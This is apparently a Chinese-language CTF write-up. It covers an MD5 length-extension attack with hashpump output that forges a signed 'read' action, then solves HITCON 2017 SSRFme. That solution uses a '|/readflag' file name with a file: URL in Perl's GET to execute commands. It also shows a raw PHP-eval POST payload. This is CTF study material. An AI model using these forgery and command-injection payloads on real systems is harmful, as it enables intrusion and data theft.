#### 真正的预期

md5拓展长度攻击

参考

[浅谈MD5扩展长度攻击](https://github.com/mstxq17/cryptograph-of-web/blob/master/%E6%B5%85%E8%B0%88MD5%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.md)

[MD5长度拓展攻击](https://www.jianshu.com/p/241e772a513f)

偏密码方面，学会个工具就行了

md5加密部分

```python
hashlib.md5(secert_key + param + action).hexdigest()
```

我们不知道key，但我们知道输入的**action**和需要改的**action**

类似**padding attack**，我们也可以用**hashdump**得到自己想要的md5加密值

param是flag.txt，结合16位的**secert_key**，构成新的密钥，24位

```sh
root@xl-pc:/home/xlccccc/HashPump-master# hashpump
Input Signature: 1df6eaa9ee163d37aa15cf1eb3d41723
Input Data: scan
Input Key Length: 24
Input Data to Add: read
8c316dd807fda6b70d9ba9b9ecf4bb08
scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read
```

得到的结果就是用`scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read`

和密钥加密后的结果，但作用与**action**为**read**是一样的

![image-20220914113437783](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\image-20220914113437783.png)

同样赋值后读到flag，这种方法很关键的一点是**param**是没变的

### [HITCON 2017]SSRFme

又是一个怪怪的知识点

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

首先创建了一个目录

```php
sandbox/md5("orange" . $_SERVER["REMOTE_ADDR"])
并进入了该目录
```

然后用GET命令执行传入的url

> **GET**
>
> 与浏览器的GET感觉上差不多，都是得到某个资源
>
> 自己体会
>
> ```shell
> xlccccc@xl-pc:/ctf$ GET /
> <HTML>
> <HEAD>
> <TITLE>Directory /</TITLE>
> <BASE HREF="file:/">
> </HEAD>
> <BODY>
> <H1>Directory listing of /</H1>
> <UL>
> <LI><A HREF="./">./</A>
> <LI><A HREF="../">../</A>
> <LI><A HREF=".Recycle_bin/">.Recycle_bin/</A>
> <LI><A HREF="bin/">bin/</A>
> <LI><A HREF="boot/">boot/</A>
> <LI><A HREF="ctf/">ctf/</A>
> <LI><A HREF="dev/">dev/</A>
> <LI><A HREF="etc/">etc/</A>
> <LI><A HREF="flag">flag</A>
> <LI><A HREF="home/">home/</A>
> <LI><A HREF="init">init</A>
> <LI><A HREF="lib/">lib/</A>
> <LI><A HREF="lib32/">lib32/</A>
> <LI><A HREF="lib64/">lib64/</A>
> <LI><A HREF="libx32/">libx32/</A>
> <LI><A HREF="lost%2Bfound/">lost+found/</A>
> <LI><A HREF="media/">media/</A>
> <LI><A HREF="mnt/">mnt/</A>
> <LI><A HREF="opt/">opt/</A>
> <LI><A HREF="patch/">patch/</A>
> <LI><A HREF="proc/">proc/</A>
> <LI><A HREF="root/">root/</A>
> <LI><A HREF="run/">run/</A>
> <LI><A HREF="sbin/">sbin/</A>
> <LI><A HREF="snap/">snap/</A>
> <LI><A HREF="srv/">srv/</A>
> <LI><A HREF="sys/">sys/</A>
> <LI><A HREF="tmp/">tmp/</A>
> <LI><A HREF="usr/">usr/</A>
> <LI><A HREF="var/">var/</A>
> <LI><A HREF="www/">www/</A>
> </UL>
> </BODY>
> </HTML>
> ```

然后将数据存入自己定义的路径

```php
?url=/&filename=aaa
```

![image-20220914161102390](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\image-20220914161102390.png)

直接读flag是行不通的，很明显要执行那个**readflag**命令

而**GET**命令在执行**file**协议时会调用**open**，而**open**命令会进行命令执行，但前提是该文件存在

```php
?url=&filename=|/readflag  #先创建该文件
?url=file:|/readflag&filename=abc  #利用file的open进行命令执行并把结果存入abc
http://8e43eaf3-33d8-4fae-9336-4977010900a2.node4.buuoj.cn:81/sandbox/230317844a87b41e353b096d0d6a5145/abc
#访问abc
```

```
POST /a.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
 
c=echo(1234);
```



